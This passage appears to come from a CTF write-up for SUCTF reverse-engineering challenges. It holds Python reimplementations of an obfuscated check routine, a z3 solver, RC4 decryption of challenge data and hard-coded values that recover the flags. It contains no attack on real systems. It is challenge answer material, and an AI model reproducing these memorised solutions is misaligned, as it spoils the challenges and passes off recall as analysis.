  return (a1 ^ a3) + a2
def  aa50(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  aa9c(a1, a2, a3):
  return (a1 + a3 + a2)
def  aad0(a1, a2, a3):
  return (a1 + a3 + a2)
def  ab04(a1, a2, a3):
  return (a1 + a3 + a2)
def  ab38(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  ab84(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  abc4(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  ac10(a1, a2, a3, a4,  a5):
  return (a1 ^ a3 ^ a4 ^ a5) + a2
def  ac5c(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  aca8(a1, a2, a3):
  return (a1 + a3 + a2)
def  acdc(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  ad1c(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  ad50(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  ad90(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  add0(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  ae10(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  ae5c(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  ae9c(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  aedc(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  af28(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  af68(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  afa8(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  afe8(a1, a2, a3):
  return (a1 + a3 + a2)
def  b01c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b05c(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  b0a8(a1, a2, a3):
  return (a1 + a3 + a2)
def  b0dc(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  b11c(a1, a2, a3, a4,  a5):
  return (a1 ^ (a3 + a4) ^ a5) + a2
def  b168(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b1a8(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b1e8(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  b234(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  b274(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  b2c0(a1, a2, a3):
  return (a1 + a3 + a2)
def  b2f4(a1, a2, a3):
  return (a1 + a3 + a2)
def  b328(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  b35c(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  b3a8(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  b3f4(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b434(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  b480(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b4c0(a1, a2, a3, a4,  a5):
  return ((a1 + a3) ^ a4 ^ a5) + a2
def  b50c(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  b54c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b58c(a1, a2, a3):
  return (a1 + a3 + a2)
def  b5c0(a1, a2, a3):
  return (a1 + a3 + a2)
def  b5f4(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  b634(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b674(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  b6c0(a1, a2, a3, a4,  a5):
  return ((a1 + a3) ^ a4 ^ a5) + a2
def  b70c(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  b758(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  b798(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  b7e4(a1, a2, a3, a4,  a5):
  return (a1 ^ a3 ^ a4 ^ a5) + a2
def  b830(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  b870(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  b8b0(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b8f0(a1, a2, a3, a4,  a5):
  return (a1 ^ (a3 + a4) ^ a5) + a2
def  b93c(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  b970(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  b9bc(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b9fc(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  ba48(a1, a2, a3):
  return (a1 + a3 + a2)
def  ba7c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  babc(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  bafc(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  bb30(a1, a2, a3):
  return (a1 + a3 + a2)
def  bb64(a1, a2, a3):
  return (a1 + a3 + a2)
def  bb98(a1, a2, a3, a4,  a5):
  return (a1 ^ (a3 + a4) ^ a5) + a2
def  bbe4(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  bc18(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  bc64(a1, a2, a3, a4,  a5):
  return ((a1 + a3) ^ a4 ^ a5) + a2
def  bcb0(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  bcf0(a1, a2, a3):
  return (a1 + a3 + a2)
def  bd24(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  bd64(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  bdb0(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  bdfc(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  be30(a1, a2, a3):
  return (a1 + a3 + a2)
def  be64(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  bea4(a1, a2, a3):
  return (a1 + a3 + a2)
def  bed8(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  bf0c(a1, a2, a3):
  return (a1 + a3 + a2)
def  bf40(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  bf74(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  bfb4(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  bff4(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  c034(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  c074(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  c0b4(a1, a2, a3):
  return (a1 + a3 + a2)
def  c0e8(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  c134(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  c174(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  c1b4(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  c1f4(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  c240(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  c274(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  c2c0(a1, a2, a3):
  return (a1 + a3 + a2)
def  c2f4(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  c340(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  c380(a1, a2, a3, a4, a5):
  return (a1 ^ a3 ^ (a4 + a5)) + a2
def  c3cc(a1, a2, a3):
  return (a1 + a3 + a2)
def  c400(a1, a2, a3, a4, a5):
  return (a1 ^ a3 ^ (a4 + a5)) + a2
def  c44c(a1, a2, a3, a4,  a5):
  return (a1 ^ (a3 + a4) ^ a5) + a2
def  c498(a1, a2, a3):
  return (a1 + a3 + a2)
def  c4cc(a1, a2, a3):
  return (a1 + a3 + a2)
def  c500(a1, a2, a3, a4, a5):
  return (a1 ^ a3 ^ (a4 + a5)) + a2
def  c54c(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  c598(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  c5d8(a1, a2, a3):
  return (a1 + a3 + a2)
def  c60c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  c64c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  c68c(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  c6d8(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  c70c(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  c74c(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  c780(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  c7b4(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  c7f4(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  c840(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  c88c(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  c8d8(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  c924(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  c958(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  c9a4(a1, a2, a3):
  return (a1 + a3 + a2)
def  c9d8(a1, a2, a3):
  return (a1 + a3 + a2)
def  ca0c(a1, a2, a3):
  return (a1 + a3 + a2)
def  ca40(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  ca80(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  cac0(a1, a2, a3):
  return (a1 + a3 + a2)
def  caf4(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  cb28(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  cb5c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  cb9c(a1, a2, a3):
  return (a1 + a3 + a2)
def  cbd0(a1, a2, a3):
  return (a1 + a3 + a2)
def  cc04(a1, a2, a3):
  return (a1 + a3 + a2)
def  cc38(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  cc78(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  ccb8(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  ccec(a1, a2, a3):
  return (a1 + a3 + a2)
def  cd20(a1, a2, a3, a4, a5):
  return (a1 ^ a3 ^ (a4 + a5)) + a2
def  cd6c(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  cda0(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  cdec(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  ce2c(a1, a2, a3):
  return (a1 + a3 + a2)
def  ce60(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  ceac(a1, a2, a3):
  return (a1 + a3 + a2)
def  cee0(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  cf20(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  cf60(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  cfa0(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  cfec(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  d02c(a1, a2, a3, a4,  a5):
  return (a1 ^ (a3 + a4) ^ a5) + a2
def  d078(a1, a2, a3, a4,  a5):
  return (a1 ^ (a3 + a4) ^ a5) + a2
def  d0c4(a1, a2, a3):
  return (a1 + a3 + a2)
def  d0f8(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  d144(a1, a2, a3, a4,  a5):
  return (a1 ^ (a3 + a4) ^ a5) + a2
def  d190(a1, a2, a3):
  return (a1 + a3 + a2)
def  d1c4(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  d204(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  d244(a1, a2, a3):
  return (a1 + a3 + a2)
def  d278(a1, a2, a3):
  return (a1 + a3 + a2)
def  d2ac(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  d2f8(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  d338(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  d378(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  d3b8(a1, a2, a3, a4,  a5):
  return (a1 ^ a3 ^ a4 ^ a5) + a2
def  d404(a1, a2, a3, a4,  a5):
  return (a1 ^ a3 ^ a4 ^ a5) + a2
def  d450(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  d49c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  d4dc(a1, a2, a3):
  return (a1 + a3 + a2)
def  d510(a1, a2, a3):
  return (a1 + a3 + a2)
def  d544(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  d590(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  d5dc(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  d61c(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  d668(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  d6a8(a1, a2, a3):
  return (a1 + a3 + a2)
def  d6dc(a1, a2, a3):
  return (a1 + a3 + a2)
def  d710(a1, a2, a3, a4, a5):
  return (a1 ^ a3 ^ (a4 + a5)) + a2
def  d75c(a1, a2, a3, a4,  a5):
  return (a1 ^ (a3 + a4) ^ a5) + a2
def  d7a8(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  d7e8(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  d834(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  d880(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  d8c0(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  d900(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  d94c(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  d98c(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  d9cc(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  da18(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  da64(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  dab0(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  daf0(a1, a2, a3):
  return (a1 + a3 + a2)
def  db24(a1, a2, a3):
  return (a1 + a3 + a2)
def  db58(a1, a2, a3):
  return (a1 + a3 + a2)
def  db8c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  dbcc(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  dc18(a1, a2, a3, a4, a5):
  return (a1 ^ a3 ^ (a4 + a5)) + a2
def  dc64(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  dca4(a1, a2, a3):
  return (a1 + a3 + a2)
def  dcd8(a1, a2, a3):
  return (a1 + a3 + a2)
def  dd0c(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  dd4c(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  dd98(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  ddd8(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  de24(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  de64(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  de98(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  ded8(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  df24(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  df64(a1, a2, a3):
  return (a1 + a3 + a2)
def  df98(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  dfe4(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  e024(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  e064(a1, a2, a3):
  return (a1 + a3 + a2)
def  e098(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  e0cc(a1, a2, a3):
  return (a1 + a3 + a2)
def  e100(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  e140(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  e180(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  e1b4(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)

func_list = [a224,a264,a2b0,a2f0,a33c,a370,a3bc,a3fc,a43c,a47c,a4b0,a4e4,a524,a564,a5a4,a5d8,a618,a64c,a680,a6cc,a700,a74c,a78c,a7c0,a7f4,a840,a874,a8b4,a900,a940,a980,a9b4,a9e8,aa1c,aa50,aa9c,aad0,ab04,ab38,ab84,abc4,ac10,ac5c,aca8,acdc,ad1c,ad50,ad90,add0,ae10,ae5c,ae9c,aedc,af28,af68,afa8,afe8,b01c,b05c,b0a8,b0dc,b11c,b168,b1a8,b1e8,b234,b274,b2c0,b2f4,b328,b35c,b3a8,b3f4,b434,b480,b4c0,b50c,b54c,b58c,b5c0,b5f4,b634,b674,b6c0,b70c,b758,b798,b7e4,b830,b870,b8b0,b8f0,b93c,b970,b9bc,b9fc,ba48,ba7c,babc,bafc,bb30,bb64,bb98,bbe4,bc18,bc64,bcb0,bcf0,bd24,bd64,bdb0,bdfc,be30,be64,bea4,bed8,bf0c,bf40,bf74,bfb4,bff4,c034,c074,c0b4,c0e8,c134,c174,c1b4,c1f4,c240,c274,c2c0,c2f4,c340,c380,c3cc,c400,c44c,c498,c4cc,c500,c54c,c598,c5d8,c60c,c64c,c68c,c6d8,c70c,c74c,c780,c7b4,c7f4,c840,c88c,c8d8,c924,c958,c9a4,c9d8,ca0c,ca40,ca80,cac0,caf4,cb28,cb5c,cb9c,cbd0,cc04,cc38,cc78,ccb8,ccec,cd20,cd6c,cda0,cdec,ce2c,ce60,ceac,cee0,cf20,cf60,cfa0,cfec,d02c,d078,d0c4,d0f8,d144,d190,d1c4,d204,d244,d278,d2ac,d2f8,d338,d378,d3b8,d404,d450,d49c,d4dc,d510,d544,d590,d5dc,d61c,d668,d6a8,d6dc,d710,d75c,d7a8,d7e8,d834,d880,d8c0,d900,d94c,d98c,d9cc,da18,da64,dab0,daf0,db24,db58,db8c,dbcc,dc18,dc64,dca4,dcd8,dd0c,dd4c,dd98,ddd8,de24,de64,de98,ded8,df24,df64,df98,dfe4,e024,e064,e098,e0cc,e100,e140,e180,e1b4,]
func_arg_number = [0x2,0x3,0x2,0x3,0x1,0x3,0x2,0x2,0x2,0x1,0x1,0x2,0x2,0x2,0x1,0x2,0x1,0x1,0x3,0x1,0x3,0x2,0x1,0x1,0x3,0x1,0x2,0x3,0x2,0x2,0x1,0x1,0x1,0x1,0x3,0x1,0x1,0x1,0x3,0x2,0x3,0x3,0x3,0x1,0x2,0x1,0x2,0x2,0x2,0x3,0x2,0x2,0x3,0x2,0x2,0x2,0x1,0x2,0x3,0x1,0x2,0x3,0x2,0x2,0x3,0x2,0x3,0x1,0x1,0x1,0x3,0x3,0x2,0x3,0x2,0x3,0x2,0x2,0x1,0x1,0x2,0x2,0x3,0x3,0x3,0x2,0x3,0x3,0x2,0x2,0x2,0x3,0x1,0x3,0x2,0x3,0x1,0x2,0x2,0x1,0x1,0x1,0x3,0x1,0x3,0x3,0x2,0x1,0x2,0x3,0x3,0x1,0x1,0x2,0x1,0x1,0x1,0x1,0x2,0x2,0x2,0x2,0x2,0x1,0x3,0x2,0x2,0x2,0x3,0x1,0x3,0x1,0x3,0x2,0x3,0x1,0x3,0x3,0x1,0x1,0x3,0x3,0x2,0x1,0x2,0x2,0x3,0x1,0x2,0x1,0x1,0x2,0x3,0x3,0x3,0x3,0x1,0x3,0x1,0x1,0x1,0x2,0x2,0x1,0x1,0x1,0x2,0x1,0x1,0x1,0x2,0x2,0x1,0x1,0x3,0x1,0x3,0x2,0x1,0x3,0x1,0x2,0x2,0x2,0x3,0x2,0x3,0x3,0x1,0x3,0x3,0x1,0x2,0x2,0x1,0x1,0x3,0x2,0x2,0x2,0x3,0x3,0x3,0x2,0x1,0x1,0x3,0x3,0x2,0x3,0x2,0x1,0x1,0x3,0x3,0x2,0x3,0x3,0x2,0x2,0x3,0x2,0x2,0x3,0x3,0x3,0x2,0x1,0x1,0x1,0x2,0x3,0x3,0x2,0x1,0x1,0x2,0x3,0x2,0x3,0x2,0x1,0x2,0x3,0x2,0x1,0x3,0x2,0x2,0x1,0x1,0x1,0x2,0x2,0x1,0x3,]
def gen_rand():
    global ii
    global jj

    ii = (ii+1)%256
    jj = (jj + sbox[ii])%256
    v2 = (sbox[ii]+sbox[jj])% 256
    return v2

def check(data):
    global ii
    global jj
    result = "a"
    ii = 0
    jj = 0
    len1 = len(data)
    assert(len1 == 0x20)
    s = [i for i in data]
    for i in range(8*len1):
        rnum0 = gen_rand()
        rnum1 = gen_rand()
        rnum2 = gen_rand()
        ridx1 = gen_rand() % len1
        ridx2 = gen_rand() % len1
        r_offset = gen_rand()
        arr = [hex(rnum0),hex(rnum1),hex(rnum2),hex(ridx1),hex(ridx2),hex(r_offset)]
        
        if(func_arg_number[r_offset]==1):
            a1= rnum0
            a2 = s[ridx1]
            a3 = s[ridx2]
            result = func_list[r_offset](a1,a2,a3) 
           
        if(func_arg_number[r_offset]==2):
            a1= rnum0
            a2= rnum1
            a3 = s[ridx1]
            a4 = s[ridx2]
            result = func_list[r_offset](a1,a2,a3,a4) 
            
        if(func_arg_number[r_offset]==3):
            a1= rnum0
            a2= rnum1
            a3 =rnum2
            a4 = s[ridx1]
            a5 = s[ridx2]
            result = func_list[r_offset](a1,a2,a3,a4,a5) 
        s[ridx1] = result
        
        
    return s
    # for m in s:
    #     print(hex(m),end=',')

result = [0x6e179,0x10a34,0x353c2,0x1174b,0x70bda,0xb015,0x3bfeb,0x2d16,0x4a320,0x1f1ac,0x8f6b,0x2098e,0x8d4,0x2428f,0x1fb5f,0x10bd5,0x10e7,0x3171b,0x1b19d,0x168,0x8dcf,0x246ba,0x7ae5d,0x6f10,0x6e11,0x13d8a,0x169b,0x3701,0x321d6,0x465f6,0x106bc,0x1298e,]

from z3 import *
cin = [i for i in b"aaaaa"]+[BitVec('x[%d]'%i,8) for i in range(32-5)]

result = [0x000D7765, 0x00011EBD, 0x00032D12, 0x00013778, 0x0008A428, 0x0000B592, 0x0003FA57, 0x00001616, 
    0x0003659E, 0x0002483A, 0x00002882, 0x000508F4, 0x00000BAD, 0x00027920, 0x0000F821, 0x00019F83, 
    0x00000F97, 0x00033904, 0x000170D5, 0x0000016C, 0x0000CF5D, 0x000280D2, 0x000A8ADE, 0x00009EAA, 
    0x00009DAB, 0x0001F45E, 0x00003214, 0x000052FA, 0x0006D57A, 0x000460ED, 0x000124FF, 0x00013936, ]
cin = [i for i in b"SUCTF"]+[BitVec('x[%d]'%i,8) for i in range(32-5)]

ans = check(cin)
#print(ans[0])
S = Solver()
for i in range(0x20):
    S.add(ans[i] == result[i])
print(S.check())
flag = S.model()
print(flag)

x = [9]*100
x[0] = 123
x[16] = 95
x[14] = 105
x[17] = 77
x[22] = 114
x[24] = 33
x[21] = 51
x[25] = 33
x[18] = 52
x[11] = 100
x[1] = 89
x[19] = 115
x[9] = 65
x[8] = 95
x[7] = 51
x[2] = 48
x[20] = 116
x[26] = 125
x[12] = 114
x[3] = 117
x[6] = 114
x[13] = 48
x[23] = 33
x[5] = 65
x[4] = 95
x[10] = 110
x[15] = 100
print(bytes(x))
# check(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab")
# print(len(func_list))
# print(len(func_arg_number))

SU_BBRE

1.打开txt发现是一段汇编，拿GPT翻译一下

2.发现有两段加密 第一段是RC4加密img

第二段就是个减法

from Crypto.Cipher import ARC4

key = b"suctf"
enc = [0x2F, 0x5A, 0x57, 0x65, 0x14, 0x8F, 0x69, 0xCD, 0x93, 0x29, 0x1A, 0x55, 0x18, 0x40, 0xE4, 0x5E]
rc4 = ARC4.new(key)
print(rc4.decrypt(bytes(enc)))

enc1 = [ 0x41, 0x6D, 0x62, 0x4D, 0x53, 0x49, 0x4E, 0x29, 0x28]
print(bytes([enc1[i] + i for i in range(len(enc1))]))

from z3 import *
import hashlib
table = [  0x03, 0x04, 0xFF, 0xFF, 0xFF, 0x05, 0xFF, 0xFF, 0xFF, 0xFF,
0xFF, 0x04, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0x02, 0xFF, 0xFF,
0x04, 0xFF, 0x07, 0xFF, 0xFF, 0xFF, 0x04, 0x06, 0x06, 0xFF,
0xFF, 0xFF, 0xFF, 0x06, 0x05, 0x06, 0x04, 0xFF, 0x05, 0xFF,
0x04, 0x07, 0xFF, 0x08, 0xFF, 0x06, 0xFF, 0xFF, 0x06, 0x06,
0x05, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0x03, 0xFF, 0x03,
0xFF, 0x05, 0x06, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x05,
0x04, 0x05, 0x07, 0x06, 0xFF, 0xFF, 0x04, 0xFF, 0x02, 0x01,
0xFF, 0xFF, 0xFF, 0x03, 0x04, 0xFF, 0xFF, 0x05, 0x04, 0x03,
0xFF, 0xFF, 0x07, 0x04, 0x03, 0xFF, 0xFF, 0x01, 0x01, 0xFF,
0xFF, 0x04, 0x03, 0xFF, 0x02, 0xFF, 0x04, 0x03, 0xFF, 0xFF,
0x02, 0xFF, 0x05, 0x04, 0xFF, 0xFF, 0x02, 0x02, 0xFF, 0xFF,
0x04, 0xFF, 0x04, 0xFF, 0x03, 0x05, 0x06, 0xFF, 0xFF, 0x00,
0xFF, 0xFF, 0xFF, 0x02, 0xFF, 0xFF, 0xFF, 0x01, 0x04, 0xFF,
0xFF, 0x07, 0x05, 0xFF, 0xFF, 0x03, 0x03, 0x02, 0xFF, 0xFF,
0x04, 0xFF, 0xFF, 0x05, 0x07, 0xFF, 0x03, 0x02, 0x04, 0x04,
0xFF, 0x07, 0x05, 0x04, 0x03, 0xFF, 0xFF, 0x04, 0xFF, 0x02,
0x04, 0x05, 0xFF, 0xFF, 0x06, 0x05, 0x04, 0xFF, 0x02, 0xFF,
0xFF, 0x07, 0x04, 0xFF, 0xFF, 0x03, 0xFF, 0x04, 0x04, 0xFF,
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x03, 0x02, 0x02,
0xFF, 0xFF, 0x02, 0x04, 0x03, 0x05, 0xFF, 0xFF, 0x05, 0xFF,
0x04, 0xFF, 0x06, 0xFF, 0xFF, 0x06, 0xFF, 0xFF, 0xFF, 0xFF,
0x03, 0x03, 0xFF, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x06,
0xFF, 0x06, 0x06, 0xFF, 0x07, 0x06, 0x04, 0xFF, 0x04, 0x03,
0xFF, 0x04, 0x03, 0x05, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
0xFF, 0xFF, 0x04, 0x06, 0x07, 0xFF, 0xFF, 0x04, 0xFF, 0xFF,
0xFF, 0x07, 0xFF, 0x05, 0xFF, 0x05, 0xFF, 0xFF, 0x06, 0x07,
0x07, 0xFF, 0x05, 0x06, 0x06, 0xFF, 0xFF, 0x02, 0x04, 0x04,
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x06, 0xFF, 0xFF, 0x07, 0x07,
0x06, 0xFF, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0xFF, 0x03,
0x05, 0xFF, 0x07, 0xFF, 0x05, 0xFF, 0x06, 0xFF, 0x05, 0xFF,
0xFF, 0x07, 0x08, 0xFF, 0xFF, 0x03, 0xFF, 0x03, 0xFF, 0xFF,
0xFF, 0xFF, 0xFF, 0x03, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
0xFF, 0x06, 0x05, 0x03, 0xFF, 0x04, 0x05, 0x05, 0x03, 0xFF,
0xFF, 0x06, 0x05, 0x05, 0x06, 0xFF, 0x06, 0x05, 0x02, 0x04,
0x03, 0x04, 0xFF, 0xFF, 0x03, 0x04, 0x04, 0x06, 0x05, 0xFF,
0x03, 0xFF, 0x05, 0x05, 0x05, 0xFF, 0xFF, 0x05, 0xFF, 0xFF,
0x04, 0xFF, 0xFF, 0x04, 0xFF, 0x07, 0x07, 0x08, 0x06, 0xFF,
0xFF, 0xFF, 0xFF, 0x05, 0xFF, 0xFF, 0xFF, 0x04, 0xFF, 0x03,
